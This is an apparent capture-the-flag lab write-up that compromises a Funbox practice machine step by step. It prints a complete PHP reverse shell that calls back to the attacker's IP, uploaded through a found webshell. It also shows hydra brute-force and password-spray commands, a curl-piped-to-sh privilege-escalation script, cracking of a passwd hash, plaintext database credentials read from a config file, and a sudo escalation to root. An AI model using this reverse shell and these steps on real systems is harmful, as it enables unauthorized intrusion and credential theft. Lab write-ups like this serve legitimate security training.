Target: 

```ini

192.168.184.132

```
# Prep

General Mind Map:
https://xmind.app/m/QsNUEz/


Confirm docker is installed and set rustscan as an alias or add to bashrc / fish config due to it being able to scan all ports and services in 10 seconds

```sh

alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a'

```


Create directory for target and enter it

```sh

mkdir FunboxEasyEnum && FunboxEasyEnum

```


Prep a nc listener

```sh

nc -nlvp 4444

```

  
Confirm ip address

```sh

hostname -I

```

  

My IP

```

192.168.45.247

```

  

Prep Rev Shells

https://revshells.com

# Recon

Start with a quick open port scan

```sh

rustscan 192.168.184.132

```

PORT   STATE SERVICE REASON

22/tcp open  ssh     syn-ack

80/tcp open  http    syn-ack

  

Quick OS check

```sh

sudo nmap -O --top-ports 1000 -v -T4 192.168.184.132 -oN os.nmap

```

No exact OS matches for host

  

Follow up with a service scan on those open ports

```sh

sudo nmap -sC -sV -Pn -p 22,80 -v -T4 192.168.184.132 -oN services.nmap

```

# Port 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   2048 9c52325b8bf638c77fa1b704854954f3 (RSA)

|   256 d6135606153624ad655e7aa18ce564f4 (ECDSA)

|_  256 1ba9f35ad05183183a23ddc4a9be59f0 (ED25519)

# Port 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

|_http-server-header: Apache/2.4.29 (Ubuntu)

| http-methods: 

|_  Supported Methods: GET POST OPTIONS HEAD

|_http-title: Apache2 Ubuntu Default Page: It works

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

Normal web page shows a default apache 2 page

  

```sh

sudo nmap -sV --script=http-title,http-enum,http-favicon,http-methods,http-passwd,http-robots.txt,http-sql-injection -p 80 -T5 192.168.184.132 -oN http.nmap

```

PORT   STATE SERVICE VERSION

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

| http-enum: 

|   /robots.txt: Robots file

|_  /phpmyadmin/: phpMyAdmin

| http-methods: 

|_  Supported Methods: GET POST OPTIONS HEAD

|_http-server-header: Apache/2.4.29 (Ubuntu)

|_http-title: Apache2 Ubuntu Default Page: It works

  
  

Robots.txt

Allow: Enum_this_Box

  

phpMyAdmin found

![[Pasted image 20231113003143.png]]

  

Extract login post request from burp and use hydra to run a background bruteforce

  

```sh

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.184.132 http-post-form "/admin/login.php:username=^USER^&password=^PASS^:Access denied for user"

```

  
  

Kernel Exploits

```sh

searchsploit Apache 2.4.29

```

Nothing version specific

  

Target URL:

```

http://192.168.184.132

```

  

Check for non-navigable directories

```sh

dirbuster

```

- Run `50` threads

- Wordlist location:

```

/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```

Dir found: / - 200

Dir found: /icons/ - 403

File found: /mini.php - 200

Dir found: /icons/small/ - 403

Dir found: /javascript/ - 403

  

Mini.php is a webshell uploader

![[Pasted image 20231113005008.png]]

  

Adding a php reverse shell

https://revshells.com

  

Pentest Monkey's PHP shell seems to be reliable

  

<details>

<?php

// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  

set_time_limit (0);

$VERSION = "1.0";

$ip = '192.168.45.247';

$port = 4444;

$chunk_size = 1400;

$write_a = null;

$error_a = null;

$shell = 'uname -a; w; id; sh -i';

$daemon = 0;

$debug = 0;

  

if (function_exists('pcntl_fork')) {

$pid = pcntl_fork();

if ($pid == -1) {

printit("ERROR: Can't fork");

exit(1);

}

if ($pid) {

exit(0);  // Parent exits

}

if (posix_setsid() == -1) {

printit("Error: Can't setsid()");

exit(1);

}

  

$daemon = 1;

} else {

printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");

}

  

chdir("/");

  

umask(0);

  

// Open reverse connection

$sock = fsockopen($ip, $port, $errno, $errstr, 30);

if (!$sock) {

printit("$errstr ($errno)");

exit(1);

}

  

$descriptorspec = array(

   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from

   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to

   2 => array("pipe", "w")   // stderr is a pipe that the child will write to

);

  

$process = proc_open($shell, $descriptorspec, $pipes);

  

if (!is_resource($process)) {

printit("ERROR: Can't spawn shell");

exit(1);

}

  

stream_set_blocking($pipes[0], 0);

stream_set_blocking($pipes[1], 0);

stream_set_blocking($pipes[2], 0);

stream_set_blocking($sock, 0);

  

printit("Successfully opened reverse shell to $ip:$port");

  

while (1) {

if (feof($sock)) {

printit("ERROR: Shell connection terminated");

break;

}

  

if (feof($pipes[1])) {

printit("ERROR: Shell process terminated");

break;

}

  

$read_a = array($sock, $pipes[1], $pipes[2]);

$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

  

if (in_array($sock, $read_a)) {

if ($debug) printit("SOCK READ");

$input = fread($sock, $chunk_size);

if ($debug) printit("SOCK: $input");

fwrite($pipes[0], $input);

}

  

if (in_array($pipes[1], $read_a)) {

if ($debug) printit("STDOUT READ");

$input = fread($pipes[1], $chunk_size);

if ($debug) printit("STDOUT: $input");

fwrite($sock, $input);

}

  

if (in_array($pipes[2], $read_a)) {

if ($debug) printit("STDERR READ");

$input = fread($pipes[2], $chunk_size);

if ($debug) printit("STDERR: $input");

fwrite($sock, $input);

}

}

  

fclose($sock);

fclose($pipes[0]);

fclose($pipes[1]);

fclose($pipes[2]);

proc_close($process);

  

function printit ($string) {

if (!$daemon) {

print "$string\n";

}

}

  

?>

</details>

  

Uploaded and navigated to http://192.168.184.132/revshell.php

![[Pasted image 20231113005435.png]]

  

Upgrade Shell

```sh

python3 -c 'import pty; pty.spawn("/bin/bash")'

```

  

## Initial Access

  

For non-privileged access proof dump

```sh

echo " "; echo "local:"; find / -type f -name "local.txt" 2>/dev/null | xargs cat 2>/dev/null;

```

local:

1356bca238c2802f66acba895bd1896a

  

## Priv Esc

  

Run Linpeas

```sh

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

```

╔══════════╣ Users with console

goat:x:1003:1003:,,,:/home/goat:/bin/bash

harry:x:1001:1001:,,,:/home/harry:/bin/bash

karla:x:1000:1000:karla:/home/karla:/bin/bash

lissy:x:1005:1005::/home/lissy:/bin/sh

oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash

root:x:0:0:root:/root:/bin/bash

sally:x:1002:1002:,,,:/home/sally:/bin/bash

═╣ Hashes inside passwd file? ........... /etc/passwd:oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash

╔══════════╣ Readable files belonging to root and readable by me but not world readable

-rw-r----- 1 root www-data 525 Sep 18  2020 /etc/phpmyadmin/config-db.php

-rw-r----- 1 root www-data 8 Sep 18  2020 /etc/phpmyadmin/htpasswd.setup

-rw-r----- 1 root www-data 68 Sep 18  2020 /var/lib/phpmyadmin/blowfish_secret.inc.php

-rw-r----- 1 root www-data 0 Sep 18  2020 /var/lib/phpmyadmin/config.inc.php

  

  For manual SUID program checking 

```sh

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

```

Nothing of note

  

Crack found hash `oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash`

  

added hash to hash file

```sh

john hash

```

hiphop           (oracle)

  

Got password from phpMyAdmin config

```

cat config-db.php

```

<?php

##

## database access settings in php format

## automatically generated from /etc/dbconfig-common/phpmyadmin.conf

## by /usr/sbin/dbconfig-generate-include

##

## by default this file is managed via ucf, so you shouldn't have to

## worry about manual changes being silently discarded.  *however*,

## you'll probably also want to edit the configuration file mentioned

## above too.

##

$dbuser='phpmyadmin';

$dbpass='tgbzhnujm!';

$basepath='';

$dbname='phpmyadmin';

$dbserver='localhost';

$dbport='3306';

$dbtype='mysql';

  

Find who the PHP Admin is with the password of `tgbzhnujm!`

  

Log in as oracle

```sh

su oracle

```

  

```sh

sudo -l

```

Not allowed on this account but now at least I have other users

  

So it's not oracle

  

Make username list of other users

```ini

goat  

harry  

karla  

sally

root

```

  

Try the password on these users via a password spray

```sh

hydra -L users -p "tgbzhnujm!" 192.168.184.132 -v -t 4 ssh -I

```

[22][ssh] host: 192.168.184.132   login: karla   password: tgbzhnujm!

  

Worked for karla

  

```sh

su karla

```

  

```sh

sudo -l

```

Matching Defaults entries for karla on funbox7:

    env_reset, mail_badpass,

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karla may run the following commands on funbox7:

    (ALL : ALL) ALL

  

karla has full sudo privileges

  

```sh

sudo bash

```

  

Now I'm root. 

Dump proof info

```sh

echo " "; echo "uname -a:"; uname -a; \

echo " "; echo "hostname:"; hostname; \

echo " "; echo "id"; id; \

echo " "; echo "ifconfig:"; /sbin/ifconfig -a; \

echo " "; echo "proof:"; cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null; echo " "

```

uname -a:

Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

hostname:

funbox7

id

uid=0(root) gid=0(root) groups=0(root)

ifconfig:

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500

        inet 192.168.184.132  netmask 255.255.255.0  broadcast 192.168.184.255

        ether 00:50:56:ba:48:f3  txqueuelen 1000  (Ethernet)

        RX packets 664576  bytes 187930017 (187.9 MB)

        RX errors 0  dropped 0  overruns 0  frame 0

        TX packets 584623  bytes 107643061 (107.6 MB)

        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536

        inet 127.0.0.1  netmask 255.0.0.0

        inet6 ::1  prefixlen 128  scopeid 0x10<host>

        loop  txqueuelen 1000  (Local Loopback)

        RX packets 1756  bytes 157800 (157.8 KB)

        RX errors 0  dropped 0  overruns 0  frame 0

        TX packets 1756  bytes 157800 (157.8 KB)

        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

proof:

9192fa6d4fb17b8fd8542b4fc42b67d8